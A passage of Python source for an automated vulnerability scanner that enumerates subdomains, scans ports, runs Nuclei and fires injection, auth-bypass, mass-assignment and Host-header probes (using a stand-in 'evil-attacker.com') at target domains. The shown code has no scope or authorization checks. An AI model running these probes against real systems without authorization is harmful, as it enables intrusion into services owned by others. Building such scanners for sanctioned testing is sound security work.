                        cvss=9.0, cwe="CWE-943",
                        remediation = "Use ORM/ODM with parameterized queries. Validate input types. Never concatenate user input.",
                        confidence  = 0.82,
                        references  = ["https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf"],
                    )
                    findings.append(f)
                    self.notify(f"[CRITICAL] NoSQL Injection on {base}{path} [{param}]", "CRITICAL")
                    break
        return findings


class LDAPInjectionChecker(VulnChecker):
    """LDAP injection detection"""
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        
        ldap_payloads = ["*", "*)(&", "*)(|", "admin*"]
        
        for param in list(params)[:3]:
            for payload in ldap_payloads:
                r = self.http.get(url, params={param: payload})
                if r and any(x in r.text.lower() for x in ['ldap', 'directory', 'distinguished name', 'dn:', 'ldapsearchexception']):
                    f = self._finding(
                        vuln_type   = "LDAP Injection",
                        severity    = Severity.HIGH,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=path, param=param,
                        description = f"LDAP injection in `{param}` - LDAP error/data disclosed",
                        evidence    = "LDAP-related error message in response",
                        payload     = payload,
                        cvss=7.5, cwe="CWE-90",
                        remediation = "Use parameterized LDAP queries. Escape all user input.",
                        confidence  = 0.85,
                        references  = ["https://owasp.org/www-community/attacks/LDAP_Injection"],
                    )
                    findings.append(f)
                    self.notify(f"[HIGH] LDAP Injection on {base}{path} [{param}]", "HIGH")
                    break
        return findings


class AuthBypassChecker(VulnChecker):
    """Authentication bypass via path manipulation"""
    def check(self, base: str, info: SubdomainInfo) -> List[Finding]:
        findings = []
        
        admin_paths = ['/admin', '/admin/', '/dashboard', '/console', '/wp-admin']
        bypass_techniques = [
            ('/../admin', 'Path traversal'),
            ('/admin/..;/', 'Semicolon bypass'),
            ('/./admin', 'Dot bypass'),
            ('/admin/;/', 'Tomcat bypass'),
            ('/%61dmin', 'URL encode'),
        ]
        
        for admin_path in admin_paths:
            # Check if admin exists
            r_admin = self.http.get(base + admin_path)
            if not r_admin or r_admin.status_code in [404, 403]:
                continue
            
            # Try bypasses
            for bypass_path, technique in bypass_techniques:
                r = self.http.get(base + bypass_path)
                if r and r.status_code == 200:
                    if any(x in r.text.lower() for x in ['admin', 'dashboard', 'control panel']):
                        f = self._finding(
                            vuln_type   = f"Authentication Bypass ({technique})",
                            severity    = Severity.CRITICAL,
                            target=base, subdomain=info.fqdn,
                            endpoint=bypass_path, param="",
                            description = f"Admin panel accessible via {technique}",
                            evidence    = f"HTTP 200 on {bypass_path}",
                            payload     = bypass_path,
                            cvss=9.1, cwe="CWE-287",
                            remediation = "Implement proper authentication checks. Normalize paths before authorization.",
                            confidence  = 0.92,
                        )
                        findings.append(f)
                        self.notify(f"[CRITICAL] Auth Bypass at {base}{bypass_path}", "CRITICAL")
        return findings


class JWTChecker(VulnChecker):
    """JWT vulnerability detection"""
    def check(self, base: str, info: SubdomainInfo) -> List[Finding]:
        findings = []
        
        # Check cookies and authorization headers for JWTs
        r = self.http.get(base)
        if not r:
            return findings
        
        jwt_token = None
        location = ""
        
        # Check Authorization header
        auth = r.request.headers.get('Authorization', '')
        if auth.startswith('Bearer ') and auth.count('.') == 2:
            jwt_token = auth[7:]
            location = "Authorization header"
        
        # Check cookies
        for cookie_name, cookie_val in r.cookies.items():
            if 'token' in cookie_name.lower() and cookie_val.count('.') == 2:
                jwt_token = cookie_val
                location = f"Cookie: {cookie_name}"
                break
        
        if not jwt_token:
            return findings
        
        try:
            parts = jwt_token.split('.')
            import base64
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            
            # Check for "none" algorithm
            if header.get('alg', '').lower() == 'none':
                f = self._finding(
                    vuln_type   = "JWT None Algorithm Vulnerability",
                    severity    = Severity.CRITICAL,
                    target=base, subdomain=info.fqdn,
                    endpoint="/", param="",
                    description = f"JWT uses 'none' algorithm in {location} - signature verification can be bypassed",
                    evidence    = f"JWT header: {header}",
                    payload     = "",
                    cvss=9.8, cwe="CWE-347",
                    remediation = "Reject JWTs with 'none' algorithm. Always verify signatures.",
                    confidence  = 0.99,
                    references  = ["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"],
                )
                findings.append(f)
                self.notify(f"[CRITICAL] JWT None Algorithm at {base}", "CRITICAL")
        except:
            pass
        
        return findings


class RateLimitChecker(VulnChecker):
    """Missing rate limiting detection"""
    def check(self, base: str, path: str) -> List[Finding]:
        findings = []
        url = base + path
        
        # Send 30 rapid requests
        success_count = 0
        for i in range(30):
            r = self.http.get(url)
            if r and r.status_code == 200:
                success_count += 1
            time.sleep(0.05)
        
        # 90%+ success = no rate limiting
        if success_count >= 27:
            f = self._finding(
                vuln_type   = "Missing Rate Limiting",
                severity    = Severity.MEDIUM,
                target=base, subdomain=base.split("//")[-1],
                endpoint=path, param="",
                description = f"Endpoint accepts {success_count}/30 rapid requests - brute force possible",
                evidence    = f"{success_count} successful requests in 1.5 seconds",
                payload     = "",
                cvss=5.3, cwe="CWE-770",
                remediation = "Implement rate limiting (e.g., 100 req/min per IP).",
                confidence  = 0.90,
            )
            findings.append(f)
            self.notify(f"[MEDIUM] No rate limit on {base}{path}", "MEDIUM")
        
        return findings


class BusinessLogicChecker(VulnChecker):
    """Business logic flaws - negative values, price manipulation"""
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        
        # Find price/quantity/discount params
        money_params = [p for p in params if any(x in p.lower() 
                       for x in ['price', 'amount', 'quantity', 'qty', 'discount', 'total', 'cost'])]
        
        for param in money_params:
            # Test negative value
            r_neg = self.http.get(url, params={param: '-1'})
            if r_neg and r_neg.status_code == 200 and 'error' not in r_neg.text.lower():
                f = self._finding(
                    vuln_type   = "Business Logic: Negative Value Accepted",
                    severity    = Severity.HIGH,
                    target=base, subdomain=base.split("//")[-1],
                    endpoint=path, param=param,
                    description = f"Parameter `{param}` accepts negative values - payment bypass possible",
                    evidence    = f"Request with {param}=-1 succeeded (HTTP 200)",
                    payload     = "-1",
                    cvss=7.5, cwe="CWE-840",
                    remediation = "Validate parameter ranges. Reject negative values for prices/quantities.",
                    confidence  = 0.88,
                )
                findings.append(f)
                self.notify(f"[HIGH] Negative value accepted on {base}{path} [{param}]", "HIGH")
            
            # Test zero
            r_zero = self.http.get(url, params={param: '0'})
            if r_zero and any(x in r_zero.text.lower() for x in ['free', 'total: 0', 'price: 0']):
                f = self._finding(
                    vuln_type   = "Business Logic: Zero Price Bypass",
                    severity    = Severity.HIGH,
                    target=base, subdomain=base.split("//")[-1],
                    endpoint=path, param=param,
                    description = f"Setting `{param}` to 0 results in free transaction",
                    evidence    = "Response contains 'free' or 'total: 0'",
                    payload     = "0",
                    cvss=7.5, cwe="CWE-840",
                    remediation = "Enforce minimum values. Server-side price validation.",
                    confidence  = 0.85,
                )
                findings.append(f)
                self.notify(f"[HIGH] Zero price bypass on {base}{path} [{param}]", "HIGH")
        
        return findings


class APISecurityChecker(VulnChecker):
    """API-specific vulnerabilities"""
    def check(self, base: str, endpoints: Set[str]) -> List[Finding]:
        findings = []
        
        api_endpoints = [e for e in endpoints if any(x in e.lower() 
                        for x in ['/api', '/rest', '/v1', '/v2', '/graphql'])]
        
        for endpoint in list(api_endpoints)[:10]:
            url = base + endpoint
            
            # Check for verbose errors
            r = self.http.get(url + '/' + 'X' * 50)
            if r and len(r.text) > 500:
                if any(x in r.text.lower() for x in ['stack trace', 'exception', 'line', 'at com.', 'at org.']):
                    f = self._finding(
                        vuln_type   = "API Information Disclosure",
                        severity    = Severity.MEDIUM,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=endpoint, param="",
                        description = "API returns verbose error messages with internal paths/stack traces",
                        evidence    = r.text[:300],
                        payload     = "",
                        cvss=5.3, cwe="CWE-209",
                        remediation = "Implement generic error messages. Disable debug mode in production.",
                        confidence  = 0.90,
                    )
                    findings.append(f)
                    self.notify(f"[MEDIUM] API info disclosure at {base}{endpoint}", "MEDIUM")
            
            # Check for exposed API keys
            r = self.http.get(url)
            if r:
                keys = re.findall(r'["\']?(api[_-]?key|apikey|access[_-]?token)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,})', r.text, re.I)
                if keys:
                    f = self._finding(
                        vuln_type   = "API Key Exposure",
                        severity    = Severity.HIGH,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=endpoint, param="",
                        description = f"API response contains {len(keys)} exposed API keys/tokens",
                        evidence    = f"Found keys in response",
                        payload     = "",
                        cvss=7.5, cwe="CWE-200",
                        remediation = "Never expose API keys in responses. Use environment variables.",
                        confidence  = 0.95,
                    )
                    findings.append(f)
                    self.notify(f"[HIGH] API keys exposed at {base}{endpoint}", "HIGH")
        
        return findings


class HostHeaderChecker(VulnChecker):
    """Host header injection / poisoning"""
    def check(self, base: str) -> List[Finding]:
        findings = []
        
        evil_host = 'evil-attacker.com'
        r = self.http.get(base, headers={'Host': evil_host})
        
        if r and evil_host in r.text:
            f = self._finding(
                vuln_type   = "Host Header Injection",
                severity    = Severity.HIGH,
                target=base, subdomain=base.split("//")[-1],
                endpoint="/", param="Host header",
                description = "Application reflects Host header - cache poisoning/password reset poisoning possible",
                evidence    = f"Injected Host '{evil_host}' reflected in response",
                payload     = evil_host,
                cvss=7.5, cwe="CWE-644",
                remediation = "Whitelist allowed hosts. Do not use Host header in sensitive operations.",
                confidence  = 0.92,
                references  = ["https://portswigger.net/web-security/host-header"],
            )
            findings.append(f)
            self.notify(f"[HIGH] Host header injection at {base}", "HIGH")
        
        return findings


class MassAssignmentChecker(VulnChecker):
    """Mass assignment / parameter pollution"""
    def check(self, base: str, path: str, params: Set[str]) -> List[Finding]:
        findings = []
        url = base + path
        
        # Try injecting admin/role parameters
        test_params = {
            'isAdmin': 'true',
            'admin': '1',
            'role': 'admin',
            'is_admin': 'true',
        }
        
        for test_param, value in test_params.items():
            test_data = {p: 'test' for p in list(params)[:5]}
            test_data[test_param] = value
            
            r = self.http.post(url, data=test_data)
            if r and r.status_code == 200:
                if any(x in r.text.lower() for x in ['admin', 'role', 'privilege', 'elevated']):
                    f = self._finding(
                        vuln_type   = "Mass Assignment",
                        severity    = Severity.HIGH,
                        target=base, subdomain=base.split("//")[-1],
                        endpoint=path, param=test_param,
                        description = f"Parameter `{test_param}` accepted - privilege escalation possible",
                        evidence    = f"Adding {test_param}={value} changed response",
                        payload     = f"{test_param}={value}",
                        cvss=8.1, cwe="CWE-915",
                        remediation = "Whitelist allowed parameters. Use DTOs with explicit fields only.",
                        confidence  = 0.80,
                        references  = ["https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"],
                    )
                    findings.append(f)
                    self.notify(f"[HIGH] Mass assignment at {base}{path}", "HIGH")
                    break
        
        return findings


# ─── Event Bus ──────────────────────────────────────────────────────────────────

class EventBus:
    """Thread-safe event queue for the TUI"""
    def __init__(self):
        self._q: queue.Queue = queue.Queue()

    def emit(self, event_type: str, data: Any):
        self._q.put({"type": event_type, "data": data, "ts": time.time()})

    def drain(self) -> List[Dict]:
        events = []
        while not self._q.empty():
            try:
                events.append(self._q.get_nowait())
            except queue.Empty:
                break
        return events

# ─── Main Engine ────────────────────────────────────────────────────────────────

class ScanEngine:
    def __init__(self, threads: int = 25, timeout: int = 10, proxy: str = None, state_db_path: str = "autobb_state.db"):
        self.threads  = threads
        self.bus      = EventBus()
        self.http     = HTTPEngine(timeout=timeout, proxy=proxy)
        self.dns      = DNSEngine()
        self.ports    = PortScanner()
        self.ssl_a    = SSLAnalyzer()
        self.fp       = TechFingerprinter()
        self.targets: Dict[str, ScanTarget] = {}
        self._lock    = threading.Lock()
        self._running = False
        
        # PERSISTENT STATE - Track changes across scans
        try:
            self.state_db = self._init_state_db(state_db_path)
            self.use_state = True
        except Exception as e:
            self.bus.emit("log", {"msg": f"⚠ State DB disabled: {e}", "level": "WARN"})
            self.state_db = None
            self.use_state = False
    
    def _init_state_db(self, db_path: str):
        """Initialize persistent state database"""
        import sqlite3
        conn = sqlite3.connect(db_path, check_same_thread=False)
        
        # Create schema
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS subdomain_state (
                subdomain TEXT PRIMARY KEY,
                domain TEXT NOT NULL,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status_code INTEGER,
                is_alive BOOLEAN,
                endpoints_count INTEGER DEFAULT 0
            );
            
            CREATE TABLE IF NOT EXISTS status_changes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                subdomain TEXT NOT NULL,
                change_type TEXT NOT NULL,
                old_value TEXT,
                new_value TEXT,
                detected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                priority INTEGER DEFAULT 5
            );
            
            CREATE INDEX IF NOT EXISTS idx_changes_priority ON status_changes(priority);
        """)
        conn.commit()
        return conn

    def add_target(self, domain: str):
        domain = domain.lower().strip()
        domain = domain.removeprefix("https://").removeprefix("http://")
        domain = domain.split("/")[0]
        with self._lock:
            self.targets[domain] = ScanTarget(domain=domain)
        self.bus.emit("target_added", domain)

    def run_all(self):
        """Process all queued targets sequentially"""
        self._running = True
        
        # Get queued targets
        queued = [d for d, t in self.targets.items() if t.status == "queued"]
        
        if not queued:
            self.bus.emit("log", {"msg": "⚠ No queued targets to scan", "level": "WARN"})
            self._running = False
            self.bus.emit("all_done", None)
            return
        
        self.bus.emit("log", {"msg": f"📋 Queue: {len(queued)} targets", "level": "INFO"})
        
        # Process each target
        for i, domain in enumerate(queued, 1):
            try:
                self.bus.emit("log", {"msg": f"▶ [{i}/{len(queued)}] Starting: {domain}", "level": "INFO"})
                
                # Run the scan
                self._scan(domain)
                
                # Mark as complete
                target = self.targets[domain]
                target.status = "done"
                target.duration = time.time() - target.scan_start
                
                stats = {
                    'subdomains': len(target.subdomains),
                    'findings': len(target.findings),
                    'critical': target.critical_count,
                    'high': target.high_count,
                }
                
                self.bus.emit("log", {
                    "msg": f"✓ [{i}/{len(queued)}] {domain} complete: {stats['findings']} findings ({stats['critical']} critical, {stats['high']} high)",
                    "level": "INFO"
                })
                self.bus.emit("scan_done", {"domain": domain, "findings": stats['findings']})
            
            except KeyboardInterrupt:
                self.bus.emit("log", {"msg": f"⚠ Scan interrupted by user", "level": "WARN"})
                self.targets[domain].status = "interrupted"
                break
            
            except Exception as e:
                self.bus.emit("log", {"msg": f"✗ {domain} FAILED: {str(e)}", "level": "ERROR"})
                self.targets[domain].status = "failed"
                import traceback
                traceback.print_exc()
        
        self._running = False
        completed = sum(1 for t in self.targets.values() if t.status == "done")
        self.bus.emit("log", {"msg": f"🏁 Queue complete: {completed}/{len(queued)} successful", "level": "INFO"})
        self.bus.emit("all_done", None)

    def _scan(self, domain: str):
        target = self.targets[domain]
        target.status     = "scanning"
        target.scan_start = time.time()
        self.bus.emit("scan_start", domain)

        def notify(msg, level="INFO"):
            self.bus.emit("log", {"msg": msg, "level": level})
            # Count findings
            if level == "CRITICAL":
                self.bus.emit("finding_critical", msg)
            elif level == "HIGH":
                self.bus.emit("finding_high", msg)

        # 1. Subdomain enumeration
        self.bus.emit("phase", {"domain": domain, "phase": "Subdomain Enumeration"})
        enumerator = SubdomainEnumerator(self.dns, self.http, notify)
        subdomains  = enumerator.enumerate(domain)

        # Also add the apex domain itself
        apex_ips = self.dns.resolve(domain)
        if apex_ips:
            subdomains[domain] = SubdomainInfo(fqdn=domain, ips=apex_ips)

        target.subdomains = subdomains
        self.bus.emit("subdomain_count", {"domain": domain, "count": len(subdomains)})
        
        # ═══ CHANGE DETECTION ═══
        if self.use_state and self.state_db:
            try:
                # Get previous subdomains
                cursor = self.state_db.execute(
                    "SELECT subdomain FROM subdomain_state WHERE domain = ?", (domain,)
                )
                prev_subs = {row[0] for row in cursor.fetchall()}
                curr_subs = set(subdomains.keys())
                
                # Detect NEW subdomains
                new_subs = curr_subs - prev_subs
                if new_subs:
                    notify(f"🆕 {len(new_subs)} NEW subdomains found: {', '.join(list(new_subs)[:5])}", "HIGH")
                    for sub in new_subs:
                        # Record as high-priority change
                        self.state_db.execute("""
                            INSERT INTO status_changes (subdomain, change_type, new_value, priority)
                            VALUES (?, 'new_subdomain', '', 2)
                        """, (sub,))
                    self.state_db.commit()
                
                # Detect disappeared subdomains
                gone_subs = prev_subs - curr_subs
                if gone_subs:
                    notify(f"⚠️ {len(gone_subs)} subdomains disappeared", "WARN")
                
            except Exception as e:
                notify(f"State tracking error: {e}", "ERROR")
        
        # Add any subdomain takeover findings
        for fqdn, info in subdomains.items():
            if hasattr(info, 'takeover_finding') and info.takeover_finding:
                target.findings.append(info.takeover_finding)
                self.bus.emit("finding", info.takeover_finding)

        # 2. Probe + crawl + SSL
        self.bus.emit("phase", {"domain": domain, "phase": "Probing & Crawling"})
        crawler    = Crawler(self.http, self.fp, notify)
        ssl_info   = {}

        def probe_sub(fqdn):
            info = subdomains[fqdn]
            crawler.probe(info)
            if info.alive and 443 in (info.ports or self.ports.scan(fqdn, [443])):
                si = self.ssl_a.analyze(fqdn)
                info.ssl_info = si
                ssl_info[fqdn] = si
            return fqdn

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe_sub, list(subdomains.keys())[:50]))
        
        # ═══ STATUS FLIP DETECTION ═══
        if self.use_state and self.state_db:
            try:
                for fqdn, info in subdomains.items():
                    if not info.alive:
                        continue
                    
                    # Check previous status
                    cursor = self.state_db.execute(
                        "SELECT status_code FROM subdomain_state WHERE subdomain = ?", (fqdn,)
                    )
                    row = cursor.fetchone()
                    
                    if row:
                        old_status = row[0]
                        new_status = info.status_code
                        
                        # CRITICAL: 403/401/404 → 200 (AUTH BYPASS!)
                        if old_status in (403, 401, 404, 500) and new_status == 200:
                            notify(f"🚨 STATUS FLIP: {fqdn} ({old_status}→{new_status}) - POSSIBLE AUTH BYPASS", "CRITICAL")
                            self.state_db.execute("""
                                INSERT INTO status_changes (subdomain, change_type, old_value, new_value, priority)
                                VALUES (?, 'status_flip', ?, ?, 1)
                            """, (fqdn, str(old_status), str(new_status)))
                            self.state_db.commit()
                    
                    # Update state
                    self.state_db.execute("""
                        INSERT OR REPLACE INTO subdomain_state 
                        (subdomain, domain, last_seen, status_code, is_alive, endpoints_count)
                        VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?, ?)
                    """, (fqdn, domain, info.status_code, info.alive, len(info.endpoints)))
                    self.state_db.commit()
            
            except Exception as e:
                notify(f"State tracking error: {e}", "ERROR")

        # 3. Port scan (on live hosts only)
        self.bus.emit("phase", {"domain": domain, "phase": "Port Scanning"})
        def port_scan_host(fqdn):
            info = subdomains[fqdn]
            if info.ips:
                open_p = self.ports.scan(fqdn, timeout=0.4)
                info.ports = open_p
                if open_p:
                    notify(f"[ports] {fqdn}: {open_p}", "INFO")
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
            list(ex.map(port_scan_host, [f for f, i in subdomains.items() if i.ips][:30]))

        # 4. Vulnerability scanning
        self.bus.emit("phase", {"domain": domain, "phase": "Vulnerability Scanning"})
        
        # Core checkers
        checkers = {
            "sqli":     SQLInjectionChecker(self.http, notify),
            "xss":      XSSChecker(self.http, notify),
            "ssrf":     SSRFChecker(self.http, notify),
            "ssti":     SSTIChecker(self.http, notify),
            "path":     PathTraversalChecker(self.http, notify),
            "redirect": OpenRedirectChecker(self.http, notify),
            "headers":  SecurityHeadersChecker(self.http, notify),
            "cors":     CORSChecker(self.http, notify),
            "ssl":      SSLChecker(self.http, notify),
            "cmdi":     CMDInjectionChecker(self.http, notify),
            "idor":     IDORChecker(self.http, notify),
            "files":    SensitiveFilesChecker(self.http, notify),
            "csrf":     CSRFChecker(self.http, notify),
            "xxe":      XXEChecker(self.http, notify),
            # NEW ENHANCED CHECKERS
            "nosqli":   NoSQLInjectionChecker(self.http, notify),
            "ldapi":    LDAPInjectionChecker(self.http, notify),
            "authbypass": AuthBypassChecker(self.http, notify),
            "jwt":      JWTChecker(self.http, notify),
            "ratelimit": RateLimitChecker(self.http, notify),
            "bizlogic": BusinessLogicChecker(self.http, notify),
            "apisec":   APISecurityChecker(self.http, notify),
            "hostheader": HostHeaderChecker(self.http, notify),
            "massassign": MassAssignmentChecker(self.http, notify),
        }
        
        # Run Nuclei scan in BACKGROUND THREAD (non-blocking, fast)
        def run_nuclei_background():
            """Run Nuclei in background so it doesn't block other checks"""
            try:
                import subprocess

                # Check if nuclei is available
                result_check = subprocess.run(['nuclei', '-version'], capture_output=True, timeout=3)
                if result_check.returncode != 0:
                    return
                
                notify("[*] Nuclei background scan starting (optimized for speed)", "INFO")
                
                # Build target list - limit to 50 targets
                targets_for_nuclei = []
                for fqdn, info in list(subdomains.items())[:50]:
                    if info.alive:
                        scheme = "https://" if 443 in (info.ports or []) else "http://"
                        targets_for_nuclei.append(scheme + fqdn)
                
                if not targets_for_nuclei:
                    notify("[!] No live targets for Nuclei", "WARN")
                    return
                
                # Write to temp file
                import tempfile
                with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                    for t in targets_for_nuclei:
                        f.write(t + '\n')
                    targets_file = f.name
                
                notify(f"[*] Nuclei scanning {len(targets_for_nuclei)} targets (background)", "INFO")
                
                # OPTIMIZED FOR SPEED + POWER
                cmd = [
                    'nuclei',
                    '-l', targets_file,
                    '-severity', 'critical,high,medium',
                    '-json',
                    '-silent',
                    
                    # SPEED SETTINGS
                    '-c', '100',              # High concurrency
                    '-rate-limit', '300',     # Fast
                    '-timeout', '7',          # Quick timeout
                    '-retries', '1',          # One retry
                    '-max-host-error', '5',   # Skip broken hosts
                    
                    '-no-interactsh',         # No DNS callbacks
                    '-exclude-tags', 'intrusive,dos,fuzz',  # Skip slow templates
                ]
                
                # Run with 5 min timeout
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                    
                    # Parse findings
                    nuclei_count = 0
                    for line in result.stdout.strip().split('\n'):
                        if not line:
                            continue
                        try:
                            data = json.loads(line)
                            info_data = data.get('info', {})
                            
                            sev_map = {'critical': Severity.CRITICAL, 'high': Severity.HIGH,
                                       'medium': Severity.MEDIUM, 'low': Severity.LOW, 'info': Severity.INFO}
                            cvss_map = {'critical': 9.5, 'high': 7.5, 'medium': 5.5, 'low': 3.0, 'info': 0.0}
                            
                            nuclei_sev = info_data.get('severity', 'info').lower()
                            
                            finding = Finding(
                                id=_make_id(),
                                vuln_type=f"Nuclei: {info_data.get('name', 'Unknown')}",
                                severity=sev_map.get(nuclei_sev, Severity.INFO),
                                target=data.get('host', ''),
                                subdomain=data.get('host', '').split('//')[- 1].split('/')[0],
                                endpoint=data.get('matched-at', '').replace(data.get('host', ''), ''),
                                param="",
                                description=info_data.get('description', ''),
                                evidence=f"Template: {data.get('template-id', '')}, Matcher: {data.get('matcher-name', '')}",
                                payload="",
                                request="",
                                response="",
                                cvss=cvss_map.get(nuclei_sev, 0.0),
                                cwe=info_data.get('classification', {}).get('cwe-id', ['CWE-Other'])[0] if info_data.get('classification', {}).get('cwe-id') else 'CWE-Other',
                                remediation=info_data.get('remediation', 'Review Nuclei template for details.'),
                                confidence=0.85,
                                references=info_data.get('reference', []) if isinstance(info_data.get('reference'), list) else [],
                                verified=False,
                                false_positive=False,
                            )
                            
                            target.findings.append(finding)
                            nuclei_count += 1
                            notify(f"[{nuclei_sev.upper()}] Nuclei: {info_data.get('name', 'Unknown')}", nuclei_sev.upper())
                            self.bus.emit("finding", finding)
                        
                        except json.JSONDecodeError:
                            continue
                    
                    notify(f"[+] Nuclei complete: {nuclei_count} findings", "INFO")
                
                except subprocess.TimeoutExpired:
                    notify("[!] Nuclei timeout after 5min - killed", "WARN")
                    subprocess.run(['pkill', '-9', 'nuclei'], timeout=2, stderr=subprocess.DEVNULL)
                
                # Cleanup
                try:
                    Path(targets_file).unlink(missing_ok=True)
                except:
                    pass
            
            except Exception as e:
                notify(f"[!] Nuclei error: {e}", "ERROR")
        
        # Start Nuclei in background (NON-BLOCKING!)
        try:
            nuclei_thread = threading.Thread(target=run_nuclei_background, daemon=True)
            nuclei_thread.start()
            notify("[*] Nuclei running in background - main scan continuing", "INFO")
        except:
            pass
            notify(f"[!] Nuclei error: {e}", "ERROR")

        def scan_sub(fqdn):
            info  = subdomains.get(fqdn)
            if not info or not info.alive:
                return []
            base  = ("https://" if 443 in (info.ports or []) else "http://") + fqdn
            found = []
            # Per-endpoint checks
            for endpoint in list(info.endpoints)[:30]:
                params = info.params.get(endpoint, set()) or {"id", "q", "search", "url"}
                for name, checker in checkers.items():
                    if name in ("headers", "cors", "ssl", "files", "csrf", "xxe"):
                        continue
                    try:
                        found += checker.check(base, endpoint, params)
                    except Exception:
                        pass
            # Per-host checks
            try: found += checkers["headers"].check(base, info)
            except Exception: pass
            try: found += checkers["cors"].check(base, info)
            except Exception: pass
            try: found += checkers["files"].check(base, info)
            except Exception: pass
            try: found += checkers["csrf"].check(base, info)
            except Exception: pass
            try: found += checkers["xxe"].check(base, info)
            except Exception: pass
            if fqdn in ssl_info:
                try: found += checkers["ssl"].check(info, ssl_info[fqdn])
                except Exception: pass
            return found

        live_subs = [f for f, i in subdomains.items() if i.alive]
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            for batch in ex.map(scan_sub, live_subs[:40]):
                target.findings.extend(batch)
                for f in batch:
                    self.bus.emit("finding", f)

        target.scan_end = time.time()
        target.status   = "done"
        self.bus.emit("scan_done", {"domain": domain, "findings": len(target.findings)})

    def stats(self) -> Dict:
        out = {"targets": 0, "subdomains": 0, "findings": 0,
               "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for t in self.targets.values():
            out["targets"]    += 1
            out["subdomains"] += len(t.subdomains)
            out["findings"]   += len(t.findings)
            for f in t.findings:
                out[f.severity.label.lower()] += 1
        return out

    def export_json(self, path: str, export_md: bool = False, reports_root: str = "reports", confidence_threshold: float = 0.70, niche: str = "graphql_api_auth", outcomes_file: str | None = None):
        data = {}
        markdown_exports = {}
        reporter = ReportGenerator(confidence_threshold=confidence_threshold, niche=niche) if export_md else None

        for domain, t in self.targets.items():
            findings = [f.to_dict() for f in t.findings]
            data[domain] = {
                "status":     t.status,
                "duration":   round(t.duration, 2),
                "subdomains": list(t.subdomains.keys()),
                "findings":   findings,
            }
            if reporter:
                markdown_exports[domain] = reporter.export_domain_reports(domain, t.findings, reports_root=reports_root, outcomes_file=outcomes_file)

        payload = {"scan_date": datetime.now().isoformat(), "results": data}
        if export_md:
            payload["markdown_reports"] = {
                "root": reports_root,
                "confidence_threshold": confidence_threshold,
                "niche": niche,
                "domains": markdown_exports,
            }

        with open(path, "w") as fh:
            json.dump(payload, fh, indent=2)
        return path

    def stop(self):
        self._running = False
        self.http.close()
